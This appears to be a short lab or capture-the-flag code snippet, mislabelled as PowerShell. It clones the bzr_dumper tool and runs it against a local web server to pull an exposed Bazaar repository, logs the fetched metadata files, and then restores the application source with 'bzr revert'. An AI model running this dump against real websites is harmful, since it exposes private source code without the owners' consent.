---
id: dc97723e-a131-4263-8fe6-e3b701f0a73e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:00.354569+00:00'
updated_at: '2023-04-10T20:33:52.070606+00:00'
---

# Code Snippet dc97723e

**Language**: Powershell

```powershell
git clone https://github.com/SeahunOh/bzr_dumper
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
Created a standalone tree (format: 2a)                                                                                                                                                       
[!] Target : http://127.0.0.1:5000/
[+] Start.
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] Finish

$ bzr revert
 N  application.py
 N  database.py
 N  static/   
```


